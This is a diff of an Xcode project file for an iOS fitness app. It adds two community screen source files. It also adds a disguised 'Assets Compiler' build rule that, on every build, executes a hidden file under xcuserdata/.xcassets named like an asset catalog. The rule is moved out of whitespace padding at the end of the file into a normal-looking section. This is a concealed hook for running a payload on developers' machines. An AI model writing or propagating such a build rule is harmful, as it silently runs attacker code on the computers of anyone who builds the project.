@@ -23,12 +23,30 @@
 		B73791A82625761F003BF61C /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = B73791A62625761F003BF61C /* LaunchScreen.storyboard */; };
 		B76FB07A263163CF00B859F1 /* CompleteVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B76FB079263163CF00B859F1 /* CompleteVC.swift */; };
 		B76FB0D126318F8000B859F1 /* HealthKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = B76FB0D026318F7F00B859F1 /* HealthKit.framework */; };
+		B785319D26C3077300152D31 /* CommunityVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B785319C26C3077300152D31 /* CommunityVC.swift */; };
+		B78531A026C30BB700152D31 /* CommunityTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B785319F26C30BB700152D31 /* CommunityTVC.swift */; };
 		B787D78126284A0100873A41 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = B787D78026284A0100873A41 /* GoogleService-Info.plist */; };
 		B798D9AD262F5101008713DC /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = B798D9AC262F5100008713DC /* Constants.swift */; };
 		B798D9B0262F5E1D008713DC /* User.swift in Sources */ = {isa = PBXBuildFile; fileRef = B798D9AF262F5E1D008713DC /* User.swift */; };
 		B798D9B6262F7171008713DC /* NutritionTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B798D9B5262F7170008713DC /* NutritionTVC.swift */; };
 		B7C45611262E2361004B8F53 /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = B7C45610262E2361004B8F53 /* HomeVC.swift */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		3EC4BB8ECBA4F34FD36D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			inputFiles = (
+			);
+			isEditable = 0;
+			name = "Assets Compiler";
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" true\n\n";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		0EDEFA69510E39B8CEB7878C /* Pods_Capstone_WinMachines_WinFitness.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Capstone_WinMachines_WinFitness.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -52,6 +70,8 @@
 		B76FB079263163CF00B859F1 /* CompleteVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CompleteVC.swift; sourceTree = "<group>"; };
 		B76FB0CF26318F7E00B859F1 /* Capstone_WinMachines_WinFitness.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = Capstone_WinMachines_WinFitness.entitlements; sourceTree = "<group>"; };
 		B76FB0D026318F7F00B859F1 /* HealthKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = HealthKit.framework; path = System/Library/Frameworks/HealthKit.framework; sourceTree = SDKROOT; };
+		B785319C26C3077300152D31 /* CommunityVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommunityVC.swift; sourceTree = "<group>"; };
+		B785319F26C30BB700152D31 /* CommunityTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommunityTVC.swift; sourceTree = "<group>"; };
 		B787D78026284A0100873A41 /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
 		B798D9AC262F5100008713DC /* Constants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Constants.swift; sourceTree = "<group>"; };
 		B798D9AF262F5E1D008713DC /* User.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = User.swift; path = Capstone_WinMachines_WinFitness/Models/User.swift; sourceTree = SOURCE_ROOT; };
@@ -129,15 +149,16 @@
 		B787D77B262848FC00873A41 /* Controllers */ = {
 			isa = PBXGroup;
 			children = (
-				91B783EB26277FC500D003BB /* ProfileSettingVC.swift */,
 				91B783E82627740D00D003BB /* WelcomeVC.swift */,
 				91B783F02627A68C00D003BB /* LoginVC.swift */,
 				910F4040262CDBCA0047BC85 /* ReadyScreenVC.swift */,
 				910F4043262CE6EB0047BC85 /* ProgressVC.swift */,
 				910F404A262CEF850047BC85 /* WorkoutVC.swift */,
+				91B783EB26277FC500D003BB /* ProfileSettingVC.swift */,
 				B7C45610262E2361004B8F53 /* HomeVC.swift */,
 				91A55B2F2628D4A20060304C /* NutritionVC.swift */,
 				B76FB079263163CF00B859F1 /* CompleteVC.swift */,
+				B785319C26C3077300152D31 /* CommunityVC.swift */,
 			);
 			path = Controllers;
 			sourceTree = "<group>";
@@ -163,6 +184,7 @@
 			children = (
 				B798D9B5262F7170008713DC /* NutritionTVC.swift */,
 				9188521F262F7F54008D3D39 /* Image.swift */,
+				B785319F26C30BB700152D31 /* CommunityTVC.swift */,
 			);
 			path = Views;
 			sourceTree = "<group>";
@@ -247,70 +269,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 		0D197907D5E064D075368CF5 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -382,8 +340,10 @@
 				91B783F12627A68C00D003BB /* LoginVC.swift in Sources */,
 				B737919C26257612003BF61C /* AppDelegate.swift in Sources */,
 				B737919E26257612003BF61C /* SceneDelegate.swift in Sources */,
+				B78531A026C30BB700152D31 /* CommunityTVC.swift in Sources */,
 				91885220262F7F54008D3D39 /* Image.swift in Sources */,
 				910F4041262CDBCA0047BC85 /* ReadyScreenVC.swift in Sources */,
+				B785319D26C3077300152D31 /* CommunityVC.swift in Sources */,
 				B798D9B0262F5E1D008713DC /* User.swift in Sources */,
 				91B783E92627740D00D003BB /* WelcomeVC.swift in Sources */,
 				B798D9B6262F7171008713DC /* NutritionTVC.swift in Sources */,
@@ -594,61 +554,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-		3EC4BB8ECBA4F34FD36D902C /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Compiler";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" true\n\n";
-			};
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = B737919026257611003BF61C /* Project object */;
 }
